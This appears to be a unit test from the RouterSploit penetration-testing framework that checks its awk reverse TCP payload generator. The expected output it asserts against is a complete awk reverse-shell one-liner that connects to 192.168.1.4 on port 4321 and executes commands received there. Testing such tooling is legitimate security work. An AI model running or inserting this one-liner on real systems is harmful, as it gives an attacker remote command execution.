from routersploit.modules.payloads.cmd.awk_reverse_tcp import Payload


# awk reverse tcp payload with lhost=192.168.1.4 lport=4321
reverse_tcp = (
    "awk 'BEGIN{s=\"/inet/tcp/0/192.168.1.4/4321\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)};'"
)


def test_payload_generation():
    """ Test scenario - payload generation """

    payload = Payload()
    payload.lhost = "192.168.1.4"
    payload.lport = 4321

    assert payload.run() == reverse_tcp
